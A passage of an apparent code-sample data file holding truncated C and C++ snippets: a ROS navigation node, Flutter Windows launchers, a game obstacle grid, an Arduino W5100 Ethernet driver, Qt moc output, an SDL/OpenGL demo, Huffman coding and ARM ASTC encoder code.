to connect to move_base nav2 server\");\n  move_base_client_->wait_for_action_server();\n  RCLCPP_INFO(logger_, \"Connected to move_base nav2 server\");\n\n  if (return_to_init_) {\n    RCLCPP_INFO(logger_, \"Getting initial pose of the robot\");\n    geometry_msgs::msg::TransformStamped transformStamped;\n    std::string map_frame = costmap_client_.getGlobalFrameID();\n    try {\n      transformStamped = tf_buffer_.lookupTransform(\n          map_frame, robot_base_frame_, tf2::TimePointZero);\n      initial_pose_.position.x = transformStamped.tra",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"obstacle.hpp\"\r\n\r\nstd::vector<std::vector<int>> Obstacle::grid = {\r\n    {0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0},\r\n    {0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0},\r\n    {0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0},\r\n    {0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0},\r\n    {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},\r\n    {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},\r\n    {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},\r\n    {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},\r\n    {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},\r\n    {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},\r\n    {1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1},\r\n    {1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1},\r\n    {1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1},\r\n    };\r\n\r\nObstacle::Obstacle(Vector2 position)\r\n{\r\n    this -> position = position;\r\n\r\n\r\n    for(unsigned int row = 0; row < grid.size(); ++row) {\r\n        for(unsigned int column = 0; column < grid[0].size(); ++column) {\r\n            if(grid[row][column] == 1) {\r\n                float pos_x = position.x + column *3;\r\n                float pos_y = position.y + row * 3;\r\n                Block block = Block({pos_x, pos_y});\r\n                blocks.push_back(block);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nvoid Obstacle::Draw() {\r\n    for(auto& block: blocks) {\r\n        block.Draw();\r\n    }\r\n}",
    "/*\n * Copyright 2018 Paul Stoffregen\n * Copyright (c) 2010 by Cristian Maglie <c.maglie@bug.st>\n *\n * This file is free software; you can redistribute it and/or modify\n * it under the terms of either the GNU General Public License version 2\n * or the GNU Lesser General Public License version 2.1, both as\n * published by the Free Software Foundation.\n */\n\n#include <Arduino.h>\n#include \"Ethernet.h\"\n#include \"w5100.h\"\n\n\n/***************************************************/\n/**            Default SS pin setting             **/\n/***************************************************/\n\n// If variant.h or other headers specifically define the\n// default SS pin for Ethernet, use it.\n#if defined(PIN_SPI_SS_ETHERNET_LIB)\n#define SS_PIN_DEFAULT  PIN_SPI_SS_ETHERNET_LIB\n\n// MKR boards default to pin 5 for MKR ETH\n// Pins 8-10 are MOSI/SCK/MISO on MRK, so don't use pin 10\n#elif defined(USE_ARDUINO_MKR_PIN_LAYOUT) || defined(ARDUINO_SAMD_MKRZERO) || defined(ARDUINO_SAMD_MKR1000) || defined(ARDUINO_SAMD_MKRFox1200) || defined(ARDUINO_SAMD_MKRGSM1400) || defined(ARDUINO_SAMD_MKRWAN1300) || defined(ARDUINO_SAMD_MKRVIDOR4000)\n#define SS_PIN_DEFAULT  5\n\n// For boards using AVR, assume shields with SS on pin 10\n// will be used.  This allows for Arduino Mega (where\n// SS is pin 53) and Arduino Leonardo (where SS is pin 17)\n// to work by default with Arduino Ethernet Shield R2 & R3.\n#elif defined(__AVR__)\n#define SS_PIN_DEFAULT  10\n\n// If variant.h or other headers define these names\n// use them if none of the other cases match\n#elif defined(PIN_SPI_SS)\n#define SS_PIN_DEFAULT  PIN_SPI_SS\n#elif defined(CORE_SS0_PIN)\n#define SS_PIN_DEFAULT  CORE_SS0_PIN\n\n// As a final fallback, use pin 10\n#else\n#define SS_PIN_DEFAULT  10\n#endif\n\n\n\n\n// W5100 controller instance\nuint8_t  W5100Class::chip = 0;\nuint8_t  W5100Class::CH_BASE_MSB;\nuint8_t  W5100Class::ss_pin = SS_PIN_DEFAULT;\n#ifdef ETHERNET_LARGE_BUFFERS\nuint16_t W5100Class::SSIZE = 2048;\nuint16_t W5100Class::SMASK = 0x07FF;\n#endif\nW5100Class W5100;\n\n// pointers and bitmasks for optimized SS pin\n#if defined(__AVR__)\n  volatile uint8_t * W5100Class::ss_pin_reg;\n  uint8_t W5100Class::ss_pin_mask;\n#elif defined(__MK20DX128__) || defined(__MK20DX256__) || defined(__MK66FX1M0__) || defined(__MK64FX512__)\n  volatile uint8_t * W5100Class::ss_pin_reg;\n#elif defined(__MKL26Z64__)\n  volatile uint8_t * W5100Class::ss_pin_reg;\n  uint8_t W5100Class::ss_pin_mask;\n#elif defined(__SAM3X8E__) || defined(__SAM3A8C__) || defined(__SAM3A4C__)\n  volatile uint32_t * W5100Class::ss_pin_reg;\n  uint32_t W5100Class::ss_pin_mask;\n#elif defined(__PIC32MX__)\n  volatile uint32_t * W5100Class::ss_pin_reg;\n  uint32_t W5100Class::ss_pin_mask;\n#elif defined(ARDUINO_ARCH_ESP8266)\n  volatile uint32_t * W5100Class::ss_pin_reg;\n  uint32_t W5100Class::ss_pin_mask;\n#elif defined(__SAMD21G18A__)\n  volatile uint32_t * W5100Class::ss_pin_reg;\n  uint32_t W5100Class::ss_pin_mask;\n#endif\n\n\nuint8_t W5100Class::init(void)\n{\n\tstatic bool initialized = false;\n\tuint8_t i;\n\n\tif (initialized) return 1;\n\n\t// Many Ethernet shields have a CAT811 or similar reset chip\n\t// connected to W5100 or W5200 chips.  The W5200 will not work at\n\t// all, and may even drive its MISO pin, until given an active low\n\t// reset pulse!  The CAT811 has a 240 ms typical pulse length, and\n\t// a 400 ms worst case maximum pulse length.  MAX811 has a worst\n\t// case maximum 560 ms pulse length.  This delay is meant to wait\n\t// until the reset pulse is ended.  If your hardware has a shorter\n\t// reset time, this can be edited or removed.\n\tdelay(560);\n\t//Serial.println(\"w5100 init\");\n\n\tSPI.begin();\n\tinitSS();\n\tresetSS();\n\tSPI.beginTransaction(SPI_ETHERNET_SETTINGS);\n\n\t// Attempt W5200 detection first, because W5200 does not properly\n\t// reset its SPI state when CS goes high (inactive).  Communication\n\t// from detecting the other chips can leave the W5200 in a state\n\t// where it won't recover, unless given a reset pulse.\n\tif (isW5200()) {\n\t\tCH_BASE_MSB = 0x40;\n#ifdef ETHERNET_LARGE_BUFFERS\n#if MAX_SOCK_NUM <= 1\n\t\tSSIZE = 16384;\n#elif MAX_SOCK_NUM <= 2\n\t\tSSIZE = 8192;\n#elif MAX_SOCK_NUM <= 4\n\t\tSSIZE = 4096;\n#else\n\t\tSSIZE = 2048;\n#endif\n\t\tSMASK = SSIZE - 1;\n#endif\n\t\tfor (i=0; i<MAX_SOCK_NUM; i++) {\n\t\t\twriteSnRX_SIZE(i, SSIZE >> 10);\n\t\t\twriteSnTX_SIZE(i, SSIZE >> 10);\n\t\t}\n\t\tfor (; i<8; i++) {\n\t\t\twriteSnRX_SIZE(i, 0);\n\t\t\twriteSnTX_SIZE(i, 0);\n\t\t}\n\t// Try W5500 next.  WIZnet finally seems to have implemented\n\t// SPI well with this chip.  It appears to be very resilient,\n\t// so try it after the fragile W5200\n\t} else if (isW5500()) {\n\t\tCH_BASE_MSB = 0x10;\n#ifdef ETHERNET_LARGE_BUFFERS\n#if MAX_SOCK_NUM <= 1\n\t\tSSIZE = 16384;\n#elif MAX_SOCK_NUM <= 2\n\t\tSSIZE = 8192;\n#elif MAX_SOCK_NUM <= 4\n\t\tSSIZE = 4096;\n#else\n\t\tSSIZE = 2048;\n#endif\n\t\tSMASK = SSIZE - 1;\n\t\tfor (i=0; i<MAX_SOCK_NUM; i++) {\n\t\t\twriteSnRX_SIZE(i, SSIZE >> 10);\n\t\t\twriteSnTX_SIZE(i, SSIZE >> 10);\n\t\t}\n\t\tfor (; i<8; i++) {\n\t\t\twriteSnRX_SIZE(i, 0);\n\t\t\twriteSnTX_SIZE(i, 0);\n\t\t}\n#endif\n\t// Try W5100 last.  This simple chip uses f",
    "/****************************************************************************\n** Meta object code from reading C++ file 'formpengiriman.h'\n**\n** Created by: The Qt Meta Object Compiler version 68 (Qt 6.5.3)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include \"../../../formpengiriman.h\"\n#include <QtCore/qmetatype.h>\n\n#if __has_include(<QtCore/qtmochelpers.h>)\n#include <QtCore/qtmochelpers.h>\n#else\nQT_BEGIN_MOC_NAMESPACE\n#endif\n\n\n#include <memory>\n\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'formpengiriman.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 68\n#error \"This file was generated using the moc from 6.5.3. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\n#ifndef Q_CONSTINIT\n#define Q_CONSTINIT\n#endif\n\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nQT_WARNING_DISABLE_GCC(\"-Wuseless-cast\")\nnamespace {\n\n#ifdef QT_MOC_HAS_STRINGDATA\nstruct qt_meta_stringdata_CLASSFormPengirimanENDCLASS_t {};\nstatic constexpr auto qt_meta_stringdata_CLASSFormPengirimanENDCLASS = QtMocHelpers::stringData(\n    \"FormPengiriman\",\n    \"on_pushButton_clicked\",\n    \"\",\n    \"on_pushButton_2_clicked\",\n    \"on_pushButton_3_clicked\"\n);\n#else  // !QT_MOC_HAS_STRING_DATA\nstruct qt_meta_stringdata_CLASSFormPengirimanENDCLASS_t {\n    uint offsetsAndSizes[10];\n    char stringdata0[15];\n    char stringdata1[22];\n    char stringdata2[1];\n    char stringdata3[24];\n    char stringdata4[24];\n};\n#define QT_MOC_LITERAL(ofs, len) \\\n    uint(sizeof(qt_meta_stringdata_CLASSFormPengirimanENDCLASS_t::offsetsAndSizes) + ofs), len \nQ_CONSTINIT static const qt_meta_stringdata_CLASSFormPengirimanENDCLASS_t qt_meta_stringdata_CLASSFormPengirimanENDCLASS = {\n    {\n        QT_MOC_LITERAL(0, 14),  // \"FormPengiriman\"\n        QT_MOC_LITERAL(15, 21),  // \"on_pushButton_clicked\"\n        QT_MOC_LITERAL(37, 0),  // \"\"\n        QT_MOC_LITERAL(38, 23),  // \"on_pushButton_2_clicked\"\n        QT_MOC_LITERAL(62, 23)   // \"on_pushButton_3_clicked\"\n    },\n    \"FormPengiriman\",\n    \"on_pushButton_clicked\",\n    \"\",\n    \"on_pushButton_2_clicked\",\n    \"on_pushButton_3_clicked\"\n};\n#undef QT_MOC_LITERAL\n#endif // !QT_MOC_HAS_STRING_DATA\n} // unnamed namespace\n\nQ_CONSTINIT static const uint qt_meta_data_CLASSFormPengirimanENDCLASS[] = {\n\n // content:\n      11,       // revision\n       0,       // classname\n       0,    0, // classinfo\n       3,   14, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       0,       // signalCount\n\n // slots: name, argc, parameters, tag, flags, initial metatype offsets\n       1,    0,   32,    2, 0x08,    1 /* Private */,\n       3,    0,   33,    2, 0x08,    2 /* Private */,\n       4,    0,   34,    2, 0x08,    3 /* Private */,\n\n // slots: parameters\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n\n       0        // eod\n};\n\nQ_CONSTINIT const QMetaObject FormPengiriman::staticMetaObject = { {\n    QMetaObject::SuperData::link<QWidget::staticMetaObject>(),\n    qt_meta_stringdata_CLASSFormPengirimanENDCLASS.offsetsAndSizes,\n    qt_meta_data_CLASSFormPengirimanENDCLASS,\n    qt_static_metacall,\n    nullptr,\n    qt_incomplete_metaTypeArray<qt_meta_stringdata_CLASSFormPengirimanENDCLASS_t,\n        // Q_OBJECT / Q_GADGET\n        QtPrivate::TypeAndForceComplete<FormPengiriman, std::true_type>,\n        // method 'on_pushButton_clicked'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'on_pushButton_2_clicked'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'on_pushButton_3_clicked'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>\n    >,\n    nullptr\n} };\n\nvoid FormPengiriman::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\n{\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        auto *_t = static_cast<FormPengiriman *>(_o);\n        (void)_t;\n        switch (_id) {\n        case 0: _t->on_pushButton_clicked(); break;\n        case 1: _t->on_pushButton_2_clicked(); break;\n        case 2: _t->on_pushButton_3_clicked(); break;\n        default: ;\n        }\n    }\n    (void)_a;\n}\n\nconst QMetaObject *FormPengiriman::metaObject() const\n{\n    return QObject::d_ptr->metaObject ? QObject::d_ptr->dynamicMetaObject() : &staticMetaObject;\n}\n\nvoid *FormPengiriman::qt_metacast(const char *_clname)\n{\n    if (!_clname) return nullptr;\n    if (!strcmp(_clname, qt_meta_stringdata_CLASSFormPengirimanENDCLASS.stringdata0))\n        return static_cast<void*>(this);\n    return QWidget::qt_metacast(_clname);\n}\n\nint FormPengiriman::qt_metacall(QMetaObject::Call _c, int _id, void **_a)\n{\n    _id = QWidget::qt_metacall(_c, _id, _a);\n    if (_id < 0)\n        return _id;\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        if (_id < 3)\n            qt_static_metacall(this, _c, _id, _a);\n        _",
    "/**\n * @file main.cpp\n * @author your name (you@domain.com)\n * @brief A simple program that creates a window with OpenGL context and\n * renders a colored triangle. This program demonstrates basic usage of SDL to\n * create a window, create an OpenGL context, and render a simple colored\n * triangle using shaders.\n * @version 0.1\n * @date 2024-05-20\n *\n * @copyright Copyright NYU Tandon School of Engineering (c) 2024\n *\n */\n#define GL_SILENCE_DEPRECATION\n#define GL_GLEXT_PROTOTYPES 1\n\n#ifdef _WINDOWS\n#include <GL/glew.h>\n#endif\n\n#include <SDL.h>\n#include <SDL_opengl.h>\n#include \"glm/mat4x4.hpp\"                // 4x4 Matrix\n#include \"glm/gtc/matrix_transform.hpp\"  // Matrix transformation methods\n#include \"ShaderProgram.h\"               // We'll talk about these later in the course\n\n // Our window dimensions\nconstexpr int WINDOW_WIDTH = 640,\nWINDOW_HEIGHT = 480;\n\n// Background color components\nconstexpr float BG_RED = 0.1922f,\nBG_BLUE = 0.549f,\nBG_GREEN = 0.9059f,\nBG_OPACITY = 1.0f;\n\n// Our viewport\u2014or our \"camera\"'s\u2014position and dimensions\nconstexpr int VIEWPORT_X = 0,\nVIEWPORT_Y = 0,\nVIEWPORT_WIDTH = WINDOW_WIDTH,\nVIEWPORT_HEIGHT = WINDOW_HEIGHT;\n\n// Our shader filepaths; these are necessary for a number of things\n// Not least, to actually draw our shapes \n// We'll have a whole lecture on these later\nconstexpr char V_SHADER_PATH[] = \"shaders/vertex.glsl\",\nF_SHADER_PATH[] = \"shaders/fragment.glsl\";\n\n// Our object's fill colour\nconstexpr float TRIANGLE_RED = 1.0,\nTRIANGLE_BLUE = 0.4,\nTRIANGLE_GREEN = 0.4,\nTRIANGLE_OPACITY = 1.0;\n\nbool g_game_is_running = true;\nSDL_Window* g_display_window;\n\nShaderProgram g_shader_program;\n\nglm::mat4 g_view_matrix,        // Defines the position (location and orientation) of the camera\ng_model_matrix,       // Defines every translation, rotation, and/or scaling applied to an object; we'll look at these next week\ng_projection_matrix;  // Defines the characteristics of your camera, such as clip panes, field of view, projection method, etc.\n\nfloat g_triangle_x = 0.0f;\nfloat g_triangle_y = 0.0f;\nfloat g_previous_ticks = 0.0f;\nfloat g_theta = 0.0f;\n\nvoid initialise()\n{\n    SDL_Init(SDL_INIT_VIDEO);\n    g_display_window = SDL_CreateWindow(\"Hello, Triangle!\",\n        SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED,\n        WINDOW_WIDTH, WINDOW_HEIGHT,\n        SDL_WINDOW_OPENGL);\n\n    if (g_display_window == nullptr)\n    {\n        std::cerr << \"ERROR: SDL Window could not be created.\\n\";\n        g_game_is_running = false;\n\n        SDL_Quit();\n        exit(1);\n    }\n\n    SDL_GLContext context = SDL_GL_CreateContext(g_display_window);\n    SDL_GL_MakeCurrent(g_display_window, context);\n\n#ifdef _WINDOWS\n    glewInit();\n#endif\n\n    // Initialise our camera\n    glViewport(VIEWPORT_X, VIEWPORT_Y, VIEWPORT_WIDTH, VIEWPORT_HEIGHT);\n\n    // Load up our shaders\n    g_shader_program.load(V_SHADER_PATH, F_SHADER_PATH);\n\n    // Initialise our view, model, and projection matrices\n    g_view_matrix = glm::mat4(1.0f);  // Defines the position (location and orientation) of the camera\n    g_model_matrix = glm::mat4(1.0f);  // Defines every translation, rotations, or scaling applied to an object\n    g_projection_matrix = glm::ortho(-5.0f, 5.0f, -3.75f, 3.75f, -1.0f, 1.0f);  // Defines the characteristics of your camera, such as clip planes, field of view, projection method etc.\n\n    g_shader_program.set_projection_matrix(g_projection_matrix);\n    g_shader_program.set_view_matrix(g_view_matrix);\n    // Notice we haven't set our model matrix yet!\n\n    g_shader_program.set_colour(TRIANGLE_RED, TRIANGLE_BLUE, TRIANGLE_GREEN, TRIANGLE_OPACITY);\n\n    // Each object has its own unique ID\n    glUseProgram(g_shader_program.get_program_id());\n\n    glClearColor(BG_RED, BG_BLUE, BG_GREEN, BG_OPACITY);\n}\n\nvoid process_input()\n{\n    SDL_Event event;\n    while (SDL_PollEvent(&event))\n    {\n        if (event.type == SDL_QUIT || event.type == SDL_WINDOWEVENT_CLOSE)\n        {\n            g_game_is_running = false;\n        }\n    }\n}\n\nvoid update() \n{ \n    /*delta time calculation*/\n    float ticks = SDL_GetTicks() / 1000.0f;\n    float delta_time = ticks - g_previous_ticks;\n    g_previous_ticks = ticks;\n    //g_theta += 0.001f;\n\n    /*update logic*/\n    //g_triangle_x += 6.0f * cos(g_theta) * delta_time;\n    //g_triangle_y += 6.0f * sin(g_theta) * delta_time;\n    //g_triangle_x = 2.0f * cos(g_theta + delta_time);\n    //g_triangle_y = 2.0f * sin(g_theta + delta_time);\n    g_triangle_x = 2.0f * cos(g_theta);\n    g_triangle_y = 2.0f * sin(g_theta);\n    g_theta += delta_time;\n\n    /*reset model matrix*/\n    g_model_matrix = glm::mat4(1.0f); //id\n\n    /*transformations*/\n    g_model_matrix = glm::translate(g_model_matrix,\n        glm::vec3(g_triangle_x, g_triangle_y, 0.0f));\n}\n\nvoid render() {\n    glClear(GL_COLOR_BUFFER_BIT);\n\n    g_shader_program.set_model_matrix(g_model_matrix);\n\n    float vertices[] =\n    {\n         0.5f, -0.5f,\n         0.0f,  0.5f,\n        -0.5f, -0.5f\n    };\n\n    glVertexAttribPointer(g_shader_program.get_po",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"nfc_test\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <string>\n#include <queue>\n#include <unordered_map>\nusing namespace std;\n\n// A Tree node\nstruct Node\n{\n    char ch;\n    int freq;\n    Node *left, *right;\n};\n\n// Function to allocate a new tree node\nNode *getNode(char ch, int freq, Node *left, Node *right)\n{\n    Node *node = new Node();\n\n    node->ch = ch;\n    node->freq = freq;\n    node->left = left;\n    node->right = right;\n\n    return node;\n}\n\n// Comparison object to be used to order the heap\nstruct comp\n{\n    bool operator()(Node *l, Node *r)\n    {\n        // highest priority item has lowest frequency\n        return l->freq > r->freq;\n    }\n};\n\n// traverse the Huffman Tree and store Huffman Codes\n// in a map.\nvoid encode(Node *root, string str,\n            unordered_map<char, string> &huffmanCode)\n{\n    if (root == nullptr)\n        return;\n\n    // found a leaf node\n    if (!root->left && !root->right)\n    {\n        huffmanCode[root->ch] = str;\n    }\n\n    encode(root->left, str + \"0\", huffmanCode);\n    encode(root->right, str + \"1\", huffmanCode);\n}\n\n// traverse the Huffman Tree and decode the encoded string\nvoid decode(Node *root, int &index, string str)\n{\n    if (root == nullptr)\n    {\n        return;\n    }\n\n    // found a leaf node\n    if (!root->left && !root->right)\n    {\n        cout << root->ch;\n        return;\n    }\n\n    index++;\n\n    if (str[index] == '0')\n        decode(root->left, index, str);\n    else\n        decode(root->right, index, str);\n}\n\n// Builds Huffman Tree and decode given input text\nvoid buildHuffmanTree(string text)\n{\n    // count frequency of appearance of each character\n    // and store it in a map\n    unordered_map<char, int> freq;\n    for (char ch : text)\n    {\n        freq[ch]++;\n    }\n\n    // Create a priority queue to store live nodes of\n    // Huffman tree;\n    priority_queue<Node *, vector<Node *>, comp> pq;\n\n    // Create a leaf node for each character\u00a0and add it\n    // to the priority queue.\n    for (auto pair : freq)\n    {\n        pq.push(getNode(pair.first, pair.second, nullptr, nullptr));\n    }\n\n    // do till there is more than one node in the queue\n    while (pq.size() != 1)\n    {\n        // Remove the two nodes of highest priority\n        // (lowest frequency) from the queue\n        Node *left = pq.top();\n        pq.pop();\n        Node *right = pq.top();\n        pq.pop();\n\n        // Create a new internal node with these two nodes\n        // as children and with frequency equal to the sum\n        // of the two nodes' frequencies. Add the new node\n        // to the priority queue.\n        int sum = left->freq + right->freq;\n        pq.push(getNode('\\0', sum, left, right));\n    }\n\n    // root stores pointer to root of Huffman Tree\n    Node *root = pq.top();\n\n    // traverse the Huffman Tree and store Huffman Codes\n    // in a map. Also prints them\n    unordered_map<char, string> huffmanCode;\n    encode(root, \"\", huffmanCode);\n\n    cout << \"Huffman Codes are :\\n\"\n         << '\\n';\n    for (auto pair : huffmanCode)\n    {\n        cout << pair.first << \" \" << pair.second << '\\n';\n    }\n\n    cout << \"\\nOriginal string was :\\n\"\n         << text << '\\n';\n\n    // print encoded string\n    string str = \"\";\n    for (char ch : text)\n    {\n        str += huffmanCode[ch];\n    }\n\n    cout << \"\\nEncoded string is :\\n\"\n         << str << '\\n';\n\n    // traverse the Huffman Tree again and this time\n    // decode the encoded string\n    int index = -1;\n    cout << \"\\nDecoded string is: \\n\";\n    while (index < (int)str.size() - 2)\n    {\n        decode(root, index, str);\n    }\n}\n\n// Huffman coding algorithm\nint main()\n{\n    string text = \"Huffman coding is a data compression algorithm.\";\n\n    buildHuffmanTree(text);\n\n    return 0;\n}",
    "// SPDX-License-Identifier: Apache-2.0\n// ----------------------------------------------------------------------------\n// Copyright 2011-2022 Arm Limited\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\"); you may not\n// use this file except in compliance with the License. You may obtain a copy\n// of the License at:\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n// WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n// License for the specific language governing permissions and limitations\n// under the License.\n// ----------------------------------------------------------------------------\n\n#if !defined(ASTCENC_DECOMPRESS_ONLY)\n\n/**\n * @brief Functions for finding best endpoint format.\n *\n * We assume there are two independent sources of error in any given partition:\n *\n *   - Encoding choice errors\n *   - Quantization errors\n *\n * Encoding choice errors are caused by encoder decisions. For example:\n *\n *   - Using luminance instead of separate RGB components.\n *   - Using a constant 1.0 alpha instead of storing an alpha component.\n *   - Using RGB+scale instead of storing two full RGB endpoints.\n *\n * Quantization errors occur due to the limited precision we use for storage. These errors generally\n * scale with quantization level, but are not actually independent of color encoding. In particular:\n *\n *   - If we can use offset encoding then quantization error is halved.\n *   - If we can use blue-contraction then quantization error for RG is halved.\n *   - If we use HDR endpoints the quantization error is higher.\n *\n * Apart from these effects, we assume the error is proportional to the quantization step size.\n */\n\n\n#include \"astcenc_internal.h\"\n#include \"astcenc_vecmathlib.h\"\n\n#include <assert.h>\n\n/**\n * @brief Compute the errors of the endpoint line options for one partition.\n *\n * Uncorrelated data assumes storing completely independent RGBA channels for each endpoint. Same\n * chroma data assumes storing RGBA endpoints which pass though the origin (LDR only). RGBL data\n * assumes storing RGB + lumashift (HDR only). Luminance error assumes storing RGB channels as a\n * single value.\n *\n *\n * @param      pi                The partition info data.\n * @param      partition_index   The partition index to compule the error for.\n * @param      blk               The image block.\n * @param      uncor_pline       The endpoint line assuming uncorrelated endpoints.\n * @param[out] uncor_err         The computed error for the uncorrelated endpoint line.\n * @param      samec_pline       The endpoint line assuming the same chroma for both endpoints.\n * @param[out] samec_err         The computed error for the uncorrelated endpoint line.\n * @param      rgbl_pline        The endpoint line assuming RGB + lumashift data.\n * @param[out] rgbl_err          The computed error for the RGB + lumashift endpoint line.\n * @param      l_pline           The endpoint line assuming luminance data.\n * @param[out] l_err             The computed error for the luminance endpoint line.\n * @param[out] a_drop_err        The computed error for dropping the alpha component.\n */\nstatic void compute_error_squared_rgb_single_partition(\n\tconst partition_info& pi,\n\tint partition_index,\n\tconst image_block& blk,\n\tconst processed_line3& uncor_pline,\n\tfloat& uncor_err,\n\tconst processed_line3& samec_pline,\n\tfloat& samec_err,\n\tconst processed_line3& rgbl_pline,\n\tfloat& rgbl_err,\n\tconst processed_line3& l_pline,\n\tfloat& l_err,\n\tfloat& a_drop_err\n) {\n\tvfloat4 ews = blk.channel_weight;\n\n\tunsigned int texel_count = pi.partition_texel_count[partition_index];\n\tconst uint8_t* texel_indexes = pi.texels_of_partition[partition_index];\n\tpromise(texel_count > 0);\n\n\tvfloatacc a_drop_errv = vfloatacc::zero();\n\tvfloat default_a(blk.get_default_alpha());\n\n\tvfloatacc uncor_errv = vfloatacc::zero();\n\tvfloat uncor_bs0(uncor_pline.bs.lane<0>());\n\tvfloat uncor_bs1(uncor_pline.bs.lane<1>());\n\tvfloat uncor_bs2(uncor_pline.bs.lane<2>());\n\n\tvfloat uncor_amod0(uncor_pline.amod.lane<0>());\n\tvfloat uncor_amod1(uncor_pline.amod.lane<1>());\n\tvfloat uncor_amod2(uncor_pline.amod.lane<2>());\n\n\tvfloatacc samec_errv = vfloatacc::zero();\n\tvfloat samec_bs0(samec_pline.bs.lane<0>());\n\tvfloat samec_bs1(samec_pline.bs.lane<1>());\n\tvfloat samec_bs2(samec_pline.bs.lane<2>());\n\n\tvfloatacc rgbl_errv = vfloatacc::zero();\n\tvfloat rgbl_bs0(rgbl_pline.bs.lane<0>());\n\tvfloat rgbl_bs1(rgbl_pline.bs.lane<1>());\n\tvfloat rgbl_bs2(rgbl_pline.bs.lane<2>());\n\n\tvfloat 